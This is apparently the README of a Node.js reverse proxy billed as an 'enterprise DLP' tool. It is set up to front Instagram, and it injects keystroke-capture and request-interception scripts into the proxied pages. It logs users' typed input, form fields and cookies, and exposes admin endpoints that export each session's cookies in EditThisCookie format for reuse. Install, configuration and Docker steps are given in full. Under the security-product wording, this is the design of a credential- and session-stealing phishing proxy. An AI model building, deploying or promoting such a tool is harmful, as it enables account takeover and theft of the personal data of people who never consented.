# 🛡️ Internal Web Proxy & DLP Engine

A high-performance, self-hosted **browser isolation and security proxy** designed for enterprise Data Loss Prevention (DLP) and traffic inspection.

It forwards user sessions to a targeted web application, rewrites external assets dynamically, isolates session cookies per user, logs structured HAR traffic, and extracts user input/cookie values for DLP wordlist analysis.

---

## 🌟 Key Features

- 🔒 **Multi-Session Cookie Isolation**: Assigns a unique `__proxy_session` ID to each browser session and persists cookies into structured JSON files (`traffic_logs/sessions/<sessionId>.json`) compatible with EditThisCookie / Chrome DevTools.
- ⚡ **Initial Cookie Seeding**: Supports pre-populating new browser sessions with initial session/auth cookies provided via `.env` or `cookies.json` (JSON array or raw header format).
- 📜 **HAR Traffic Logging**: Automated background buffering and flushing of HTTP requests and responses into standard `.har` format.
- 🔍 **DLP & Data Extraction**: In-memory and disk recording of form fields, JSON body parameters, query parameters, cookies, and client-side keystroke input captures.
- 🛠️ **Client-Side JS Shim**: Intercepts `fetch()`, `XMLHttpRequest`, and `history.pushState` on proxied pages to transparently route API traffic back to the proxy.
- 📊 **Admin Inspection APIs**: RESTful endpoints to query HAR stats, view DLP entries/values, download log files, and export active session cookies.

---

## 🚀 Quick Start

### 1. Installation

```bash
git clone https://github.com/your-org/internal-web-proxy.git
cd internal-web-proxy
npm install
```

### 2. Configuration

Copy the example environment template:

```bash
cp .env.example .env
```

Edit `.env`:

```env
# Target site to proxy
TARGET_DOMAIN=https://www.instagram.com

# Port to run proxy on
PORT=3000

# Optional: Initial seed cookies (JSON array format or raw Cookie header)
SESSION_COOKIE='[{"name":"datr","value":"xxx","domain":".instagram.com"}]'
```

### 3. Run the Proxy

```bash
# Development (with nodemon auto-restart, excluding traffic logs)
npm run dev

# Production
npm start
```

Access the proxied target application at **`http://localhost:3000`**.

---

## 🐳 Docker Deployment

Build and run using Docker Compose:

```bash
# Build & start container in background
docker-compose up -d

# View live proxy logs
docker-compose logs -f

# Shutdown proxy container
docker-compose down
```

---

## ⚙️ Environment Variables Reference

| Variable | Required | Default | Description |
|---|---|---|---|
| `TARGET_DOMAIN` | **Yes** | — | Full URL of the upstream target site (e.g. `https://www.instagram.com`) |
| `PORT` | No | `3000` | Port for the local proxy server to listen on |
| `SESSION_COOKIE` | No | — | Initial seed cookies in JSON array or `name=val; name2=val2` format |
| `SESSION_COOKIE_FILE` | No | `cookies.json` | Path to a file containing seed cookies |
| `TRAFFIC_LOG_DIR` | No | `./traffic_logs` | Directory for storing HAR files, session JSONs, and DLP logs |
| `TRAFFIC_LOG_ROTATE_MINUTES` | No | `60` | Interval (in minutes) to rotate HAR log files |
| `TRAFFIC_LOG_BODIES` | No | `true` | Include request/response body contents in HAR logs |
| `TRAFFIC_LOG_MAX_BODY_KB` | No | `512` | Maximum body size captured per request/response in KB |
| `PROXY_HTTPS` | No | `false` | Set to `true` when deploying behind HTTPS to preserve `Secure` cookies |

---

## 📖 Admin API Documentation

The proxy exposes several internal administration endpoints under `/__admin__/` for telemetry, DLP analysis, and session inspection.

### 1. HAR Telemetry APIs

#### `GET /__admin__/har/stats`
Returns current HAR logger statistics.
```json
{
  "totalLogged": 142,
  "buffered": 12,
  "lastFlushedFile": "traffic_2026-10-01_12-08-29.har",
  "logDir": "./traffic_logs"
}
```

#### `POST /__admin__/har/flush`
Forces an immediate flush of buffered entries to disk.
```json
{
  "flushed": true,
  "file": "traffic_2026-10-01_12-08-29.har"
}
```

#### `GET /__admin__/har/list`
Lists all generated HAR files stored on the server.

#### `GET /__admin__/har/download/:filename`
Downloads a specific HAR log file by name.

#### `GET /__admin__/har/latest`
Flushes and downloads the most recently updated HAR file.

---

### 2. Data Loss Prevention (DLP) APIs

#### `GET /__admin__/dlp/stats`
Returns total recorded entries and status of the DLP capture buffer.
```json
{
  "totalCaptured": 850,
  "buffered": 5,
  "activeLogFile": "traffic_logs/dlp_data_2026-10-01.jsonl"
}
```

#### `GET /__admin__/dlp/entries`
Query structured DLP entries.
- **Query Parameters**:
  - `type`: Filter by entry type (`cookie`, `form_field`, `json_field`, `query_param`, `input_capture`)
  - `limit`: Number of entries to return (default: `500`)

```json
{
  "count": 2,
  "entries": [
    {
      "timestamp": "2026-10-01T12:09:03.490Z",
      "type": "input_capture",
      "source": "client",
      "field": "email",
      "value": "user@example.com",
      "inputType": "text",
      "url": "/",
      "method": "INPUT"
    }
  ]
}
```

#### `GET /__admin__/dlp/values`
Flattened key-value endpoint optimized for rapid wordlist matching and pattern scanning.
- **Query Parameters**: `type`, `limit`

#### `POST /__admin__/dlp/flush`
Flushes any buffered DLP entries to the daily `.jsonl` log file.

#### `GET /__admin__/dlp/files`
Lists all archived DLP `.jsonl` files.

#### `GET /__admin__/dlp/download/:filename`
Downloads a specific DLP JSONL log file.

---

### 3. Session & Cookie Management APIs

#### `GET /__admin__/session/cookies`
Returns the EditThisCookie-compatible JSON array of stored cookies for the requester's active session.

#### `GET /__admin__/session/:id/cookies`
Returns stored cookies for a specific session ID (`:id`).

```json
[
  {
    "domain": ".instagram.com",
    "expirationDate": 1817431281.157624,
    "hostOnly": false,
    "httpOnly": true,
    "name": "ps_n",
    "path": "/",
    "sameSite": "no_restriction",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "1"
  }
]
```

---

## 🏗️ Architecture & Request Flow

```
[ Client Browser ]
       │
       ├─► 1. GET / ──► [ Proxy Server ] ──► Fetch Upstream (injects session cookies)
       │                    │
       │                    ├─► Rewrites HTML/CSS resources
       │                    └─► Injects /__proxy_shim__/proxy.js & inputMonitor.js
       │
       ├─► 2. API / AJAX Calls ──► Intercepted by proxy.js shim ──► POST /__relay__
       │                                                                 │
       │                                              [ Proxy Server ] ◄─┘
       │                                                    │
       │                                                    ├─► Forward to Upstream
       │                                                    ├─► Ingest Set-Cookie into Session Jar
       │                                                    └─► Extract & Append to DLP / HAR Logs
```

---

## 📄 License

MIT License. Designed for security testing, enterprise research, and browser isolation architecture.
